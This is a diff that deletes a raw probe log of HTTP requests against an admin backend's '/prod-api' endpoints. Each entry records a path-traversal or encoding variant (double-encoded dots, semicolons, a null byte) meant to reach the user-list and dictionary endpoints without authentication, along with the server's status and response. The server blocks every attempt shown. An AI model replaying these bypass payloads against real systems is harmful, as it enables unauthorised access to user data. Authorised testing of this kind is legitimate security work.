@@ -1,30 +1,0 @@
-URL: /prod-api/auth/tenant/list/../../system/user/list?pageNum=1&pageSize=1
-  HTTP=200 len=      72
-  BODY: {"code":404,"msg":"No endpoint GET /auth/system/user/list.","data":null}
-URL: /prod-api/auth/..%2F..%2Fsystem/user/list?pageNum=1&pageSize=1
-  HTTP=200 len=    5795
-  BODY: <!doctype html><html>  <head>    <meta charset="utf-8" />    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />    <meta name="renderer" content="webkit" />    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />    <link rel=
-URL: /prod-api/auth/%252e%252e/system/user/list?pageNum=1&pageSize=1
-  HTTP=200 len=      48
-  BODY: 非法请求：/auth/%252e%252e/system/user/list
-URL: /prod-api/auth;/../system/user/list?pageNum=1&pageSize=1
-  HTTP=200 len=      84
-  BODY: {"code":401,"msg":"当前账号尚未登录，请登录后继续操作","data":null}
-URL: /prod-api/auth/..;/auth/../system/user/list?pageNum=1&pageSize=1
-  HTTP=200 len=      41
-  BODY: 非法请求：/auth/..;/system/user/list
-URL: /prod-api/auth/....//system/user/list?pageNum=1&pageSize=1
-  HTTP=200 len=      42
-  BODY: 非法请求：/auth/..../system/user/list
-URL: /prod-api/auth/../system/user/getInfo
-  HTTP=200 len=      84
-  BODY: {"code":401,"msg":"当前账号尚未登录，请登录后继续操作","data":null}
-URL: /prod-api/auth/%2e%2e;/system/user/list?pageNum=1&pageSize=1
-  HTTP=200 len=      41
-  BODY: 非法请求：/auth/..;/system/user/list
-URL: /prod-api/auth/..%00/system/user/list?pageNum=1&pageSize=1
-  HTTP=400 len=     157
-  BODY: <html><head><title>400 Bad Request</title></head><body><center><h1>400 Bad Request</h1></center><hr><center>nginx/1.29.4</center></body></html>
-URL: /prod-api/auth/../system/dict/type/list
-  HTTP=200 len=      84
-  BODY: {"code":401,"msg":"当前账号尚未登录，请登录后继续操作","data":null}
